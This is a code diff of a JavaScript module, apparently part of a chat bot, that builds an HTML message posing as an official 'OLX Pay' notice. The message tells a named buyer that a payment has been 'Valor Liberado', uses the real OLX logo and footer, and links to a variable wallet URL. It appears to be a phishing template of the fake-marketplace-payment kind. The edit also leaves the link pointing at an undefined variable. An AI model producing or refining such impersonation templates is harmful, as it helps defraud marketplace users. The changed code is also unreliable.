@@ -962,17 +962,21 @@ module.exports = async (conn, mek, dataVendas) => {
       const dataEscapada = escapeHtml(dataAtual);
       const urlEscapada = escapeHtml(urlCarteira);
 
-      return `<!DOCTYPE html>
+      return `💰 Valor Liberado!<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💰 Valor Liberado - OLX Pay</title>
+    <title>Valor Liberado - OLX Pay</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f6;
             padding: 20px;
             min-height: 100vh;
             display: flex;
@@ -981,149 +985,144 @@ module.exports = async (conn, mek, dataVendas) => {
         }
         .container {
             background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
             max-width: 600px;
             width: 100%;
-            overflow: hidden;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-        .header {
-            background: linear-gradient(135deg, #6e0ad6 0%, #764ba2 100%);
-            color: white;
-            padding: 40px 20px;
+        .logo-container {
             text-align: center;
+            margin-bottom: 20px;
         }
-        .header h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
+        .logo-container img {
+            height: 45px;
         }
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        .content {
-            padding: 40px 20px;
+        h1 {
+            color: #7c00ff;
+            font-size: 20px;
+            margin-bottom: 20px;
         }
         .greeting {
-            font-size: 16px;
+            font-size: 15px;
             color: #333;
-            margin-bottom: 20px;
-            line-height: 1.6;
+            margin-bottom: 15px;
+            line-height: 1.5;
         }
         .highlight {
-            background: #f0f7ff;
-            border-left: 4px solid #6e0ad6;
-            padding: 20px;
-            margin: 25px 0;
+            background-color: #f9f9f9;
+            border: 1px solid #e0e0e0;
+            border-left: 4px solid #7c00ff;
+            padding: 16px;
+            margin: 20px 0;
             border-radius: 8px;
+        }
+        .amount-label {
+            color: #666; 
+            font-size: 13px; 
+            margin-bottom: 6px;
         }
         .amount {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 700;
-            color: #6e0ad6;
-            margin: 10px 0;
+            color: #7c00ff;
+            margin-bottom: 6px;
         }
-        .product-info {
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            border: 1px solid #e0e0e0;
-        }
-        .product-info p {
-            color: #666;
-            margin: 8px 0;
-            font-size: 14px;
-        }
-        .cta-section {
-            margin: 30px 0;
-            text-align: center;
-        }
-        .btn-primary {
-            display: inline-block;
-            background: linear-gradient(135deg, #6e0ad6 0%, #764ba2 100%);
-            color: white;
-            text-decoration: none;
-            padding: 16px 40px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 16px;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 8px 25px rgba(110, 10, 214, 0.3);
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(110, 10, 214, 0.4);
-        }
-        .footer {
-            background: #f5f5f5;
-            padding: 20px;
-            text-align: center;
-            border-top: 1px solid #e0e0e0;
+        .product-code {
+            color: #777; 
             font-size: 12px;
-            color: #999;
-        }
-        .footer p {
-            margin: 5px 0;
         }
         .code {
-            background: #f0f0f0;
+            background: #eee;
             padding: 2px 6px;
             border-radius: 4px;
             font-family: monospace;
             color: #333;
         }
-        @media (max-width: 600px) {
-            .header h1 { font-size: 24px; }
-            .amount { font-size: 24px; }
-            .content { padding: 30px 15px; }
+        .cta-section {
+            margin: 25px 0;
+            text-align: center;
+        }
+        .btn-primary {
+            display: inline-block;
+            background-color: #7c00ff;
+            color: #fff;
+            text-decoration: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 15px;
+            transition: background-color 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #6a00db;
+        }
+        .security-alert {
+            background: #fff9e6; 
+            border-left: 4px solid #ffc107; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin: 20px 0;
+        }
+        .security-alert p {
+            color: #856404; 
+            font-size: 13.5px; 
+            line-height: 1.4;
+            margin: 0;
+        }
+        .footer {
+            margin-top: 30px;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 20px;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+        }
+        .footer a {
+            color: #7c00ff;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>💰 Valor Liberado!</h1>
-            <p>Seu pagamento foi processado com sucesso</p>
+        <!-- Logo Oficial da OLX -->
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX Logo" />
         </div>
 
-        <div class="content">
-            <div class="greeting">
-                Olá <strong>${nomeCompraEscapado}</strong>,<br><br>
-                Temos o prazer de informar que seu valor foi liberado e está disponível na sua carteira OLX Pay!
-            </div>
+        <h1>💰 Valor Liberado!</h1>
 
-            <div class="highlight">
-                <p style="color: #666; font-size: 13px; margin: 0 0 10px 0;">Valor total liberado:</p>
-                <div class="amount">${valorEscapado}</div>
-                <p style="color: #999; font-size: 12px; margin: 10px 0 0 0;">
-                    Código do produto: <span class="code">${codigoEscapado}</span>
-                </p>
-            </div>
+        <div class="greeting">
+            Olá <strong>${nomeCompraEscapado}</strong>,<br><br>
+            Temos o prazer de informar que seu valor foi liberado e está disponível na sua carteira OLX Pay!
+        </div>
 
-            <div class="product-info">
-                <p><strong>Produto:</strong> ${produtoEscapado}</p>
-                <p><strong>Data:</strong> ${dataEscapada}</p>
-                <p><strong>Status:</strong> ✅ Liberado</p>
+        <div class="query-highlight highlight">
+            <div class="amount-label">Valor total liberado:</div>
+            <div class="amount">${valorEscapado}</div>
+            <div class="product-code">
+                Código do produto: <span class="code">${codigoEscapado}</span>
             </div>
+        </div>
 
-            <div class="cta-section">
-                <a href="${urlEscapada}" class="btn-primary">
-                    Acessar minha carteira
-                </a>
-            </div>
+        <div class="cta-section">
+            <a href="${urlEscapado}" class="btn-primary">
+                Acessar minha carteira
+            </a>
+        </div>
 
-            <div style="background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; border-radius: 8px; margin: 25px 0;">
-                <p style="color: #856404; font-size: 14px; margin: 0;">
-                    <strong>ℹ️ Informação importante:</strong> Por motivos de segurança, você poderá sacar o valor após 2 dias úteis da solicitação. Acesse sua carteira para mais detalhes e gerenciar suas contas bancárias.
-                </p>
-            </div>
+        <div class="security-alert">
+            <p>
+                <strong>ℹ️ Informação importante:</strong> Por motivos de segurança, você poderá sacar o valor após 2 dias úteis da solicitação. Acesse sua carteira para mais detalhes e gerenciar suas contas bancárias.
+            </p>
         </div>
 
         <div class="footer">
             <p>Esta é uma mensagem automática do sistema OLX PAY</p>
             <p>© 2024 OLX Brasil. Todos os direitos reservados</p>
-            <p>Para suporte, visite: <a href="https://ajuda.olx.com.br" style="color: #6e0ad6; text-decoration: none;">ajuda.olx.com.br</a></p>
+            <p>Para suporte, visite: <a href="https://ajuda.olx.com.br">ajuda.olx.com.br</a></p>
         </div>
     </div>
 </body>
